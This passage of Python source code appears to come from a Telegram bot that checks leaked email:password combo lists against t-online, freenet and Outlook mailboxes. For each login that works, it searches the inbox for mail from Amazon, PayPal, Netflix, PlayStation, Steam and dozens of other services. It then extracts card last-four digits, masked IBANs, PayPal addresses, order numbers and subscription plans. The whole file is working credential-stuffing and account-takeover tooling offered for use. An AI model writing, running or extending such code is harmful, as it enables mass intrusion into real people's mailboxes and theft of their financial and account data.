    "hotmail.sk": "imap-mail.outlook.com",
}


class TOnlineChecker:
    """Generic IMAP Checker for t-online.de, freenet.de, online.de"""

    IMAP_PORT = 993
    IMAP_TIMEOUT = 2

    @staticmethod
    def _connect(imap_host="imap.t-online.de"):
        """Create IMAP connection with timeout"""
        import socket
        old_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(TOnlineChecker.IMAP_TIMEOUT)
        try:
            mail = imaplib.IMAP4_SSL(imap_host, TOnlineChecker.IMAP_PORT)
            if hasattr(mail, 'sock') and mail.sock:
                mail.sock.settimeout(TOnlineChecker.IMAP_TIMEOUT)
            return mail
        finally:
            socket.setdefaulttimeout(old_timeout)

    @staticmethod
    def _safe_close(mail):
        if mail:
            try:
                mail.logout()
            except Exception:
                try:
                    mail.shutdown()
                except Exception:
                    pass

    @staticmethod
    def _get_imap_host(email_addr):
        domain = email_addr.lower().split("@")[-1] if "@" in email_addr else ""
        return IMAP_DOMAINS.get(domain, "imap.t-online.de")

    @staticmethod
    def check_account(email, password):
        mail = None
        try:
            imap_host = TOnlineChecker._get_imap_host(email)
            mail = TOnlineChecker._connect(imap_host)
            mail.login(email, password)
            return {"status": "HIT", "imap": True}
        except imaplib.IMAP4.error:
            return {"status": "BAD"}
        except Exception:
            return {"status": "RETRY"}
        finally:
            TOnlineChecker._safe_close(mail)

    @staticmethod
    def search_inbox(email, password, sender_query):
        results = []
        mail = None
        try:
            imap_host = TOnlineChecker._get_imap_host(email)
            mail = TOnlineChecker._connect(imap_host)
            mail.login(email, password)
            for folder in ["INBOX", "Spam"]:
                try:
                    status, _ = mail.select(folder)
                    if status != "OK":
                        continue
                    _, data = mail.search(None, f'FROM "{sender_query}"')
                    if data and data[0]:
                        ids = data[0].split()
                        results.extend(ids)
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            TOnlineChecker._safe_close(mail)
        return results

    @staticmethod
    def search_and_fetch(email, password, sender_query, max_count=5):
        """Search AND fetch in one IMAP connection (fast)"""
        fetched = []
        found = False
        mail = None
        try:
            imap_host = TOnlineChecker._get_imap_host(email)
            mail = TOnlineChecker._connect(imap_host)
            mail.login(email, password)
            for folder in ["INBOX", "Spam"]:
                try:
                    status, _ = mail.select(folder)
                    if status != "OK":
                        continue
                    _, data = mail.search(None, f'FROM "{sender_query}"')
                    if not data or not data[0]:
                        continue
                    found = True
                    ids = data[0].split()[-max_count:]
                    for msg_id in ids:
                        try:
                            _, msg_data = mail.fetch(msg_id, "(RFC822)")
                            if msg_data and msg_data[0]:
                                raw = msg_data[0][1]
                                msg = email_lib.message_from_bytes(raw)
                                subject = ""
                                subj_raw = msg.get("Subject", "")
                                if subj_raw:
                                    decoded_parts = decode_header(subj_raw)
                                    for part, enc in decoded_parts:
                                        if isinstance(part, bytes):
                                            subject += part.decode(enc or "utf-8", errors="ignore")
                                        else:
                                            subject += part
                                body = ""
                                if msg.is_multipart():
                                    for part in msg.walk():
                                        if part.get_content_type() == "text/plain":
                                            try:
                                                body += part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                            except Exception:
                                                pass
                                else:
                                    try:
                                        body = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                                    except Exception:
                                        pass
                                fetched.append({"subject": subject, "body": body})
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            TOnlineChecker._safe_close(mail)
        return found, fetched

    @staticmethod
    def fetch_emails_from(email, password, sender_email, max_count=5):
        """Fetch email bodies from a specific sender on t-online"""
        _, fetched = TOnlineChecker.search_and_fetch(email, password, sender_email, max_count)
        return fetched


def check_account_auto(email, password):
    """Auto-detect email provider and use correct checker"""
    domain = email.lower().split("@")[-1] if "@" in email else ""
    if domain in IMAP_DOMAINS:
        return TOnlineChecker.check_account(email, password), "tonline"
    else:
        return HotmailChecker.check_account(email, password), "hotmail"


def extract_payment_from_text(text):
    """Extract payment methods from email text - comprehensive DE/EN"""
    methods = []
    text_lower = text.lower() if text else ""
    text_orig = text or ""

    visa_match = re.search(r'visa[^\d]{0,15}(\d{4})', text_lower)
    mc_match = re.search(r'(?:mastercard|master\s*card)[^\d]{0,15}(\d{4})', text_lower)
    amex_match = re.search(r'(?:amex|american\s*express)[^\d]{0,15}(\d{4})', text_lower)
    maestro_match = re.search(r'maestro[^\d]{0,15}(\d{4})', text_lower)
    diners_match = re.search(r'diners[^\d]{0,15}(\d{4})', text_lower)
    discover_match = re.search(r'discover[^\d]{0,15}(\d{4})', text_lower)

    card_ending = re.search(r'(?:card|karte)[^\d]*(?:ending|endet|last\s*4|letzte)[^\d]*(\d{4})', text_lower)
    generic_card = re.search(r'(?:credit|debit|kredit|giro|ec)[\-\s]*(?:card|karte)[^\d]{0,15}(\d{4})', text_lower)
    last4_match = re.search(r'\*{3,}\s*(\d{4})', text_lower) or re.search(r'x{3,}\s*(\d{4})', text_lower)
    masked_card = re.search(r'(\d{4}[\s\-]*\*{4,}[\s\-]*\*{4,}[\s\-]*\d{4})', text_lower)

    iban_match = re.search(r'(DE\d{2}\s*\d{4}\s*\d{4}\s*\d{4}\s*\d{4}\s*\d{2})', text_orig, re.IGNORECASE)
    iban_masked = re.search(r'(DE\d{2}[\s]*[*xX]{4,}[\s]*\d{4})', text_orig, re.IGNORECASE)

    has_named_card = False

    if visa_match:
        methods.append(f"💳 Visa ****{visa_match.group(1)}")
        has_named_card = True
    if mc_match:
        methods.append(f"💳 Mastercard ****{mc_match.group(1)}")
        has_named_card = True
    if amex_match:
        methods.append(f"💳 Amex ****{amex_match.group(1)}")
        has_named_card = True
    if maestro_match:
        methods.append(f"💳 Maestro ****{maestro_match.group(1)}")
        has_named_card = True
    if diners_match:
        methods.append(f"💳 Diners ****{diners_match.group(1)}")
        has_named_card = True
    if discover_match:
        methods.append(f"💳 Discover ****{discover_match.group(1)}")
        has_named_card = True
    if card_ending and not has_named_card:
        methods.append(f"💳 Karte ****{card_ending.group(1)}")
        has_named_card = True
    if generic_card and not has_named_card:
        methods.append(f"💳 Karte ****{generic_card.group(1)}")
        has_named_card = True
    if masked_card and not has_named_card:
        methods.append(f"💳 Karte {masked_card.group(1)}")
        has_named_card = True
    if last4_match and not has_named_card:
        methods.append(f"💳 Karte ****{last4_match.group(1)}")

    if 'paypal' in text_lower:
        pp_email = re.search(r'paypal[^@]*?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', text_lower)
        if pp_email:
            methods.append(f"PayPal ({pp_email.group(1)})")
        else:
            methods.append("PayPal")
    if 'klarna' in text_lower:
        if 'sofort' in text_lower or 'klarna sofort' in text_lower:
            methods.append("Klarna Sofort")
        elif re.search(r'klarna.*rechnungskauf|rechnungskauf.*klarna|klarna.*rechnung|rechnung.*klarna', text_lower):
            methods.append("Klarna Rechnung")
        elif re.search(r'klarna.*rat|rat.*klarna', text_lower):
            methods.append("Klarna Ratenzahlung")
        else:
            methods.append("Klarna")
    if 'apple pay' in text_lower or 'applepay' in text_lower:
        methods.append("Apple Pay")
    if 'google pay' in text_lower or 'googlepay' in text_lower or 'g pay' in text_lower:
        methods.append("Google Pay")
    if 'samsung pay' in text_lower:
        methods.append("Samsung Pay")

    if re.search(r'(?:sepa|lastschrift|einzug|bankeinzug|direct\s*debit|abbuchung)', text_lower):
        if iban_match:
            iban_val = iban_match.group(1).replace(" ", "")
            methods.append(f"Lastschrift (IBAN: {iban_val[:6]}****{iban_val[-4:]})")
        elif iban_masked:
            methods.append(f"Lastschrift (IBAN: {iban_masked.group(1)})")
        else:
            methods.append("SEPA-Lastschrift")
    elif iban_match and not any('Lastschrift' in m or 'IBAN' in m for m in methods):
        iban_val = iban_match.group(1).replace(" ", "")
        methods.append(f"Bankverbindung (IBAN: {iban_val[:6]}****{iban_val[-4:]})")
    elif iban_masked and not any('IBAN' in m for m in methods):
        methods.append(f"Bankverbindung (IBAN: {iban_masked.group(1)})")

    if re.search(r'(?:auf rechnung|kauf auf rechnung|rechnungskauf|per rechnung|invoice|pay later|zahlung per rechnung)', text_lower) and 'klarna' not in text_lower:
        methods.append("Kauf auf Rechnung")
    if re.search(r'(?:ratenzahlung|ratenkauf|in raten|monatliche rate|finanzierung|installment)', text_lower) and 'klarna' not in text_lower:
        methods.append("Ratenzahlung")
    if re.search(r'(?:nachnahme|cash on delivery|bei lieferung|an der t.r)', text_lower):
        methods.append("Nachnahme")
    if re.search(r'(?:vorkasse|vorab.berweisung|bank.?transfer|wire transfer|prepayment)', text_lower):
        methods.append("Vorkasse/Überweisung")
    if re.search(r'(?:sofort.berweisung|sofort banking|sofortüberweisung)', text_lower) and 'klarna' not in text_lower:
        methods.append("Sofortüberweisung")
    if re.search(r'(?:giropay)', text_lower):
        methods.append("Giropay")
    if re.search(r'(?:eps[\s\-])', text_lower):
        methods.append("EPS")
    if re.search(r'(?:ideal|i\s*deal)', text_lower):
        methods.append("iDEAL")
    if re.search(r'gutschein|gift\s*card|voucher|guthaben', text_lower):
        gc_val = re.search(r'(?:gutschein|gift\s*card|voucher|guthaben)[^\d]{0,15}(\d+[.,]\d{2})', text_lower)
        if gc_val:
            methods.append(f"Voucher ({gc_val.group(1)}€)")
        else:
            methods.append("Voucher/Credit")

    amount_match = re.search(r'(?:gesamt|total|summe|betrag|amount|zu zahlen|gesamtbetrag|endbetrag)[:\s]*(\d+[.,]\d{2})\s*(?:€|eur|euro)?', text_lower)
    if amount_match:
        amt = amount_match.group(1)
        methods.append(f"Betrag: {amt}€")

    return list(dict.fromkeys(methods))


def extract_ryd_data(email_texts):
    """Extract RYD order and payment info from email bodies"""
    orders = []
    payments = []
    for item in email_texts:
        combined = (item.get("subject", "") + " " + item.get("body", ""))
        combined_lower = combined.lower()

        order_match = re.search(r'(?:order|bestellung|booking|buchung)[^\w]*([A-Z0-9\-]{4,20})', combined, re.IGNORECASE)
        if order_match:
            order_num = order_match.group(1)
            if order_num not in orders:
                orders.append(order_num)

        found_payments = extract_payment_from_text(combined_lower)
        for p in found_payments:
            if p not in payments:
                payments.append(p)

    return orders, payments


def _inbox_search_hotmail(token, cid, query_str):
    search_url = "https://outlook.live.com/search/api/v2/query"
    headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}"
    }
    payload = {
        "Cvid": str(uuid.uuid4()),
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "UTC",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": query_str},
            "Size": 1,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
        }]
    }
    try:
        r = requests.post(search_url, json=payload, headers=headers, timeout=3)
        if r.status_code == 200:
            data = r.json()
            for entity_set in data.get('EntitySets', []):
                for result_set in entity_set.get('ResultSets', []):
                    if result_set.get('Total', 0) > 0:
                        return True
    except Exception:
        pass
    return False


def _hotmail_search_and_fetch(token, cid, query_str, size=5):
    search_url = "https://outlook.live.com/search/api/v2/query"
    headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}"
    }
    payload = {
        "Cvid": str(uuid.uuid4()),
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "UTC",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Message",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": query_str},
            "Size": size,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
        }]
    }
    try:
        r = requests.post(search_url, json=payload, headers=headers, timeout=4)
        if r.status_code == 200:
            data = r.json()
            results = []
            for entity_set in data.get('EntitySets', []):
                for result_set in entity_set.get('ResultSets', []):
                    for res in result_set.get('Results', []):
                        results.append({
                            "subject": res.get("Subject", ""),
                            "body": res.get("Preview", "")
                        })
            return results
    except Exception:
        pass
    return []


INBOX_SERVICES = {
    "amazon": {
        "name": "Amazon",
        "emoji": "📦",
        "mode": "inbox_amazon",
        "tonline_senders": ["auto-confirm@amazon.de", "shipment-tracking@amazon.de", "noreply@amazon.de", "auto-confirm@amazon.com"],
        "hotmail_queries": ['from:"auto-confirm@amazon.de"', 'from:"shipment-tracking@amazon.de"', 'from:"noreply@amazon.de"', 'from:"auto-confirm@amazon.com"'],
        "order_regex": r'(?:Bestellnummer|order|Bestell-Nr|Order\s*#)[^\w]*([A-Z0-9\-]{5,25})',
    },
    "paypal": {
        "name": "PayPal",
        "emoji": "💰",
        "mode": "inbox_paypal",
        "tonline_senders": ["service@paypal.de", "service@paypal.com", "paypal@mail.paypal.de"],
        "hotmail_queries": ['from:"service@paypal.de"', 'from:"service@paypal.com"', 'from:"paypal@mail.paypal.de"'],
        "order_regex": r'(?:Transaktionscode|Transaction\s*ID|Transaktions-ID)[^\w]*([A-Z0-9\-]{8,30})',
    },
    "uber": {
        "name": "Uber",
        "emoji": "🚕",
        "mode": "inbox_uber",
        "tonline_senders": ["noreply@uber.com", "uber@uber.com"],
        "hotmail_queries": ['from:"noreply@uber.com"', 'from:"uber@uber.com"'],
        "order_regex": r'(?:trip|fahrt|ride|receipt)[^\w]*([A-Z0-9\-]{5,25})',
    },
    "lieferando": {
        "name": "Lieferando",
        "emoji": "🍕",
        "mode": "inbox_lieferando",
        "tonline_senders": ["noreply@lieferando.de", "info@lieferando.de", "no-reply@connect.lieferando.de", "no-reply@lieferando.de"],
        "hotmail_queries": ['from:"noreply@lieferando.de"', 'from:"info@lieferando.de"', 'from:"no-reply@connect.lieferando.de"', 'from:"no-reply@lieferando.de"'],
        "order_regex": r'(?:Bestellnummer|order|Bestell-Nr)[^\w]*([A-Z0-9\-]{4,20})',
    },
    "booking": {
        "name": "Booking.com",
        "emoji": "✈️",
        "mode": "inbox_booking",
        "tonline_senders": ["noreply@booking.com", "customer.service@booking.com"],
        "hotmail_queries": ['from:"noreply@booking.com"', 'from:"customer.service@booking.com"'],
        "order_regex": r'(?:Buchungsnummer|Confirmation\s*number|booking\s*number|reservation)[^\w]*([A-Z0-9\.\-]{4,20})',
    },
    "zalando": {
        "name": "Zalando",
        "emoji": "👗",
        "mode": "inbox_zalando",
        "tonline_senders": ["noreply@zalando.de", "service@zalando.de", "newsletter@zalando.de"],
        "hotmail_queries": ['from:"noreply@zalando.de"', 'from:"service@zalando.de"', 'from:"newsletter@zalando.de"'],
        "order_regex": r'(?:Bestellnummer|Bestell-Nr|order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "lime": {
        "name": "Lime",
        "emoji": "🛴",
        "mode": "inbox_lime",
        "tonline_senders": ["no-reply@li.me"],
        "hotmail_queries": ['from:"no-reply@li.me"'],
        "order_regex": r'(?:trip|ride|fahrt|receipt|order)[^\w]*([A-Z0-9\-]{4,25})',
    },
    "payback": {
        "name": "PAYBACK",
        "emoji": "💳",
        "mode": "inbox_payback",
        "tonline_senders": ["service@payback.de"],
        "hotmail_queries": ['from:"service@payback.de"'],
        "order_regex": r'(?:Punkte|Points|Punktestand|Guthaben)',
        "custom_handler": "payback",
    },
    "mcdonalds": {
        "name": "McDonald's",
        "emoji": "🍔",
        "mode": "inbox_mcdonalds",
        "tonline_senders": ["noreply@mcdonalds.de", "info@mcdonalds.de", "noreply@mcdonalds.com", "mcdonalds@email.mcdonalds.com"],
        "hotmail_queries": ['from:"noreply@mcdonalds.de"', 'from:"mcdonalds.de"', 'from:"mcdonalds.com"'],
        "order_regex": r'(?:Bestellnummer|Bestell-Nr|Order)[^\w]*([A-Z0-9\-]{4,20})',
    },
    "deutschebahn": {
        "name": "Deutsche Bahn",
        "emoji": "🚆",
        "mode": "inbox_deutschebahn",
        "tonline_senders": ["noreply@bahn.de", "noreply@deutschebahn.com"],
        "hotmail_queries": ['from:"noreply@bahn.de"', 'from:"noreply@deutschebahn.com"'],
        "order_regex": r'(?:Auftragsnummer|Buchungsnummer|Booking|Order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "dhl": {
        "name": "DHL",
        "emoji": "📦",
        "mode": "inbox_dhl",
        "tonline_senders": ["noreply@dhl.de", "paket@dhl.de"],
        "hotmail_queries": ['from:"noreply@dhl.de"', 'from:"paket@dhl.de"'],
        "order_regex": r'(?:Sendungsnummer|Tracking|Paketnummer)[^\w]*([A-Z0-9\-]{8,30})',
    },
    "otto": {
        "name": "Otto",
        "emoji": "🛒",
        "mode": "inbox_otto",
        "tonline_senders": ["noreply@otto.de", "service@otto.de"],
        "hotmail_queries": ['from:"noreply@otto.de"', 'from:"service@otto.de"'],
        "order_regex": r'(?:Bestellnummer|Auftragsnummer|Order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "ebay": {
        "name": "eBay",
        "emoji": "🏷️",
        "mode": "inbox_ebay",
        "tonline_senders": ["ebay@ebay.de", "reply@ebay.de"],
        "hotmail_queries": ['from:"ebay@ebay.de"', 'from:"reply@ebay.de"'],
        "order_regex": r'(?:Artikelnummer|Bestellnummer|Item)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "netflix": {
        "name": "Netflix",
        "emoji": "🎬",
        "mode": "inbox_netflix",
        "tonline_senders": ["info@account.netflix.com"],
        "hotmail_queries": ['from:"info@account.netflix.com"'],
        "order_regex": r'(?:account|Konto|subscription)[^\w]*([A-Z0-9\-]{5,20})',
        "premium_only": False,
        "plan_detect": True,
        "premium_keywords": ["your netflix plan", "netflix plan", "netflix premium", "standard with ads", "standard plan", "basic plan", "ultra hd", "4k plan", "4 screens", "next billing date", "billing date", "you've been charged", "you have been charged", "your membership", "your subscription", "monthly plan", "annual plan"],
        "admin_only": True,
    },
    "netflix_count": {
        "name": "Netflix",
        "emoji": "🎬",
        "mode": "inbox_netflix_count",
        "tonline_senders": ["info@account.netflix.com"],
        "hotmail_queries": ['from:"info@account.netflix.com"'],
        "order_regex": r'(?:account|subscription)[^\w]*([A-Z0-9\-]{5,20})',
        "premium_only": False,
        "plan_detect": False,
        "count_mode": True,
    },
    "psn": {
        "name": "PlayStation (PSN)",
        "emoji": "🎮",
        "mode": "inbox_psn",
        "tonline_senders": [
            "reply@txn-email.playstation.com",
            "noreply@playstation.com",
            "no-reply@email.playstation.com",
            "no-reply@txn-email.playstation.com",
            "psn@email.playstation.com",
        ],
        "hotmail_queries": [
            'from:"reply@txn-email.playstation.com"',
            'from:"noreply@playstation.com"',
            'from:"no-reply@email.playstation.com"',
            'from:"no-reply@txn-email.playstation.com"',
        ],
        "order_regex": r'(?:order|transaction|purchase|ref(?:erence)?)[^\w]*([A-Z0-9\-]{5,25})',
        "premium_only": False,
        "plan_detect": True,
        "count_mode": False,
        "psn_mode": True,
        "premium_keywords": [
            "ps plus", "playstation plus", "essential", "extra", "premium",
            "purchase", "payment", "charged", "wallet", "subscription",
            "renewal", "game", "add-on", "dlc", "in-game",
        ],
    },
    "steam": {
        "name": "Steam",
        "emoji": "💻",
        "mode": "inbox_steam",
        "tonline_senders": ["noreply@steampowered.com"],
        "hotmail_queries": ['from:"noreply@steampowered.com"'],
        "order_regex": r'(?:order|purchase|transaction)[^\w]*([A-Z0-9\-]{5,25})',
        "premium_only": False,
        "plan_detect": True,
        "count_mode": False,
        "steam_mode": True,
        "premium_keywords": [
            "purchase", "payment", "charged", "wallet", "gift",
            "steam guard", "order", "transaction", "your receipt",
        ],
    },
    "crunchyroll": {
        "name": "Crunchyroll",
        "emoji": "🍥",
        "mode": "inbox_crunchyroll",
        "tonline_senders": ["support@crunchyroll.com", "noreply@crunchyroll.com", "no-reply@crunchyroll.com"],
        "hotmail_queries": ['from:"support@crunchyroll.com"', 'from:"noreply@crunchyroll.com"', 'from:"no-reply@crunchyroll.com"'],
        "order_regex": r'(?:account|subscription|plan|order)[^\w]*([A-Z0-9\-]{5,20})',
        "premium_only": True,
        "premium_keywords": ["premium", "mega fan", "ultimate fan", "subscription", "billing", "payment", "charged", "plan", "fan tier", "crunchyroll premium"],
    },
    "spotify": {
        "name": "Spotify",
        "emoji": "🎵",
        "mode": "inbox_spotify",
        "tonline_senders": ["no-reply@spotify.com"],
        "hotmail_queries": ['from:"no-reply@spotify.com"'],
        "order_regex": r'(?:account|Konto|subscription)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "check24": {
        "name": "Check24",
        "emoji": "✅",
        "mode": "inbox_check24",
        "tonline_senders": ["noreply@check24.de", "info@check24.de"],
        "hotmail_queries": ['from:"noreply@check24.de"', 'from:"info@check24.de"'],
        "order_regex": r'(?:Vertragsnummer|Auftragsnummer|Buchung)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "shein": {
        "name": "SHEIN",
        "emoji": "👠",
        "mode": "inbox_shein",
        "tonline_senders": ["noreply@sheinnotice.com"],
        "hotmail_queries": ['from:"noreply@sheinnotice.com"'],
        "order_regex": r'(?:Bestellnummer|Order|order\s*number)[^\w]*([A-Z0-9\-]{5,25})',
    },
    "flixbus": {
        "name": "FlixBus",
        "emoji": "🚌",
        "mode": "inbox_flixbus",
        "tonline_senders": ["noreply@flixbus.com", "booking@flixbus.com"],
        "hotmail_queries": ['from:"noreply@flixbus.com"', 'from:"booking@flixbus.com"'],
        "order_regex": r'(?:Buchungsnummer|Booking|Order)[^\w]*([A-Z0-9\-]{5,20})',
    },
    "flaschenpost": {
        "name": "Flaschenpost",
        "emoji": "🍾",
        "mode": "inbox_flaschenpost",
        "tonline_senders": ["noreply@flaschenpost.de", "info@flaschenpost.de"],
        "hotmail_queries": ['from:"noreply@flaschenpost.de"', 'from:"info@flaschenpost.de"'],
        "order_regex": r'(?:Bestellnummer|Bestell-Nr|Order)[^\w]*([A-Z0-9\-]{4,20})',
    },
}

KNOWN_SERVICE_SENDERS = {
    "ryd": ["noreply@ryd.one"],
    "limehome": ["noreply@limehome.com", "info@limehome.com"],
    "lime": ["no-reply@li.me"],
    "amazon": ["auto-confirm@amazon.de", "shipment-tracking@amazon.de", "noreply@amazon.de", "auto-confirm@amazon.com"],
    "paypal": ["service@paypal.de", "service@paypal.com", "paypal@mail.paypal.de"],
    "uber": ["noreply@uber.com", "uber@uber.com"],
    "lieferando": ["noreply@lieferando.de", "info@lieferando.de", "no-reply@connect.lieferando.de", "no-reply@lieferando.de"],
    "booking": ["noreply@booking.com", "customer.service@booking.com"],
    "zalando": ["noreply@zalando.de", "service@zalando.de"],
    "netflix": ["info@account.netflix.com"],
    "crunchyroll": ["support@crunchyroll.com", "noreply@crunchyroll.com", "no-reply@crunchyroll.com"],
    "spotify": ["no-reply@spotify.com"],
    "instagram": ["security@mail.instagram.com"],
    "facebook": ["security@facebookmail.com"],
    "tiktok": ["register@account.tiktok.com"],
    "twitter": ["info@x.com"],
    "linkedin": ["security-noreply@linkedin.com"],
    "snapchat": ["no-reply@accounts.snapchat.com"],
    "discord": ["noreply@discord.com"],
    "steam": ["noreply@steampowered.com"],
    "xbox": ["xboxreps@engage.xbox.com"],
    "playstation": ["reply@txn-email.playstation.com"],
    "epic": ["help@acct.epicgames.com"],
    "epic games": ["help@acct.epicgames.com"],
    "disney": ["no-reply@disneyplus.com"],
    "disney+": ["no-reply@disneyplus.com"],
    "reddit": ["noreply@reddit.com", "noreply@redditmail.com"],
    "twitch": ["no-reply@twitch.tv"],
    "shein": ["noreply@sheinnotice.com"],
    "check24": ["noreply@check24.de", "info@check24.de"],
    "ebay": ["ebay@ebay.de", "reply@ebay.de"],
    "otto": ["noreply@otto.de", "service@otto.de"],
    "dhl": ["noreply@dhl.de", "paket@dhl.de"],
    "hermes": ["noreply@myhermes.de"],
    "google": ["no-reply@accounts.google.com"],
    "apple": ["noreply@email.apple.com", "appleid@id.apple.com"],
    "microsoft": ["account-security-noreply@accountprotection.microsoft.com"],
    "payback": ["service@payback.de"],
    "deutschebahn": ["noreply@bahn.de", "noreply@deutschebahn.com"],
    "deutsche bahn": ["noreply@bahn.de", "noreply@deutschebahn.com"],
    "db": ["noreply@bahn.de", "noreply@deutschebahn.com"],
    "flixbus": ["noreply@flixbus.com", "booking@flixbus.com"],
    "flaschenpost": ["noreply@flaschenpost.de", "info@flaschenpost.de"],
    "mcdonalds": ["noreply@mcdonalds.de", "info@mcdonalds.de", "noreply@mcdonalds.com", "mcdonalds@email.mcdonalds.com"],
    "mcdonald's": ["noreply@mcdonalds.de", "info@mcdonalds.de", "noreply@mcdonalds.com", "mcdonalds@email.mcdonalds.com"],
}


def run_generic_inbox_check(message, user_id, service_key):
    svc = INBOX_SERVICES[service_key]
    service_name = svc["name"]
    emoji = svc["emoji"]
    tonline_senders = svc["tonline_senders"]
    hotmail_queries = svc["hotmail_queries"]
    order_regex = svc["order_regex"]
    premium_only = svc.get("premium_only", False)
    premium_keywords = svc.get("premium_keywords", [])
    plan_detect = svc.get("plan_detect", False)
    count_mode = svc.get("count_mode", False)
    psn_mode   = svc.get("psn_mode", False)
    steam_mode = svc.get("steam_mode", False)

    def _detect_psn_plan(text):
        t = text.lower()
        if "ps plus premium" in t or "playstation plus premium" in t:
            return "👑 PS Plus Premium"
        elif "ps plus extra" in t or "playstation plus extra" in t:
            return "⭐ PS Plus Extra"
        elif "ps plus essential" in t or "playstation plus essential" in t or "ps plus" in t or "playstation plus" in t:
            return "✅ PS Plus Essential"
        elif "purchase" in t or "payment" in t or "charged" in t or "order" in t:
            return "🛒 Purchase"
        elif "wallet" in t:
            return "💳 Wallet Top-up"
        elif "game" in t or "add-on" in t or "dlc" in t:
            return "🎮 Game Purchase"
        return "✅ Activity Found"

    def _detect_steam_type(text):
        t = text.lower()
        if "wallet" in t or "funds" in t or "added" in t:
            return "💰 Wallet Top-up"
        elif "gift" in t:
            return "🎁 Gift"
        elif "steam guard" in t or "new computer" in t or "new device" in t:
            return "🔐 Steam Guard Auth"
        elif "purchase" in t or "order" in t or "receipt" in t or "payment" in t:
            game_match = re.search(r'(?:you(?:\'ve)? purchased|thank you for buying|receipt for)[:\s]+([^\n\r]{3,60})', text, re.IGNORECASE)
            if game_match:
                return f"🛒 {game_match.group(1).strip()[:40]}"
            return "🛒 Purchase"
        return "✅ Activity Found"

    def _extract_expiry_date(text):
        patterns = [
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews|plan renewal|next renewal|charge date|billed on|charged on|expires on|valid until|valid through|access until|your subscription will renew)[^\n\r]{0,30}?([A-Za-z]+ \d{1,2},?\s*\d{4})',
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews|plan renewal|next renewal|charge date|billed on|charged on|expires on|valid until|valid through|access until|your subscription will renew)[^\n\r]{0,30}?(\d{1,2}[\/\-\.]\d{1,2}[\/\-\.]\d{2,4})',
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews|plan renewal|next renewal|charge date|billed on|charged on|expires on|valid until|valid through|access until)[^\n\r]{0,30}?(\d{4}[\/\-]\d{1,2}[\/\-]\d{1,2})',
            r'(?:next billing date|renewal date|renews on|your next payment|next charge|billing date|membership renews|subscription renews|your plan renews)[^\n\r]{0,30}?(\d{1,2}\s+[A-Za-z]+\s+\d{4})',
        ]
        for pat in patterns:
            m = re.search(pat, text, re.IGNORECASE)
            if m:
                return m.group(1).strip()
        return None

    def _detect_plan_name(text):
        t = text.lower()
        if '4k' in t or 'ultra hd' in t or '4 screens' in t:
            return '👑 Premium 4K (Ultra HD)'
        elif 'premium' in t:
            return '👑 Premium'
        elif 'standard with ads' in t:
            return '📺 Standard with Ads'
        elif 'standard' in t:
            return '📺 Standard (HD)'
        elif 'basic' in t:
            return '📱 Basic'
        elif 'subscription' in t or 'billing' in t or 'payment' in t or 'plan' in t:
            return '💳 Paid Plan'
        return '✅ Active'

    try:
        downloaded_file = _download_combo(message)
        if downloaded_file is None:
            return
        raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        combos = []
        for line in raw_lines:
            line = line.strip()
            if not line or ':' not in line:
                continue
            p2 = line.split(':', 1)
            ea, pw = p2[0].strip(), p2[1].strip()
            if pw and '@' in ea and '.' in ea.split('@')[-1]:
                combos.append((ea, pw))
        if not combos:
            bot.send_message(message.chat.id, "❌ No valid lines found.")
            user_sessions.pop(user_id, None)
            return
        _launch_generic_inbox_with_combos(
            combos, message.chat.id,
            message.from_user.username or "",
            user_id, service_key
        )
    except Exception as e:
        try:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        except:
            pass


def _launch_generic_inbox_with_combos(combos, chat_id, username, user_id, service_key):
    """Launch a generic inbox check from a pre-parsed combo list (supports multipart)."""
    svc = INBOX_SERVICES[service_key]
    service_name = svc["name"]
    emoji = svc["emoji"]
    tonline_senders = svc["tonline_senders"]
    hotmail_queries = svc["hotmail_queries"]
    order_regex = svc["order_regex"]
    premium_only = svc.get("premium_only", False)
    premium_keywords = svc.get("premium_keywords", [])
    plan_detect = svc.get("plan_detect", False)
    count_mode = svc.get("count_mode", False)
    psn_mode   = svc.get("psn_mode", False)
    steam_mode = svc.get("steam_mode", False)

    def _detect_psn_plan(text):
        t = text.lower()
        if "ps plus premium" in t or "playstation plus premium" in t:
            return "👑 PS Plus Premium"
        elif "ps plus extra" in t or "playstation plus extra" in t:
            return "⭐ PS Plus Extra"
        elif "ps plus essential" in t or "playstation plus essential" in t or "ps plus" in t or "playstation plus" in t:
            return "✅ PS Plus Essential"
        elif "purchase" in t or "payment" in t or "charged" in t or "order" in t:
            return "🛒 Purchase"
        elif "wallet" in t:
            return "💳 Wallet Top-up"
        elif "game" in t or "add-on" in t or "dlc" in t:
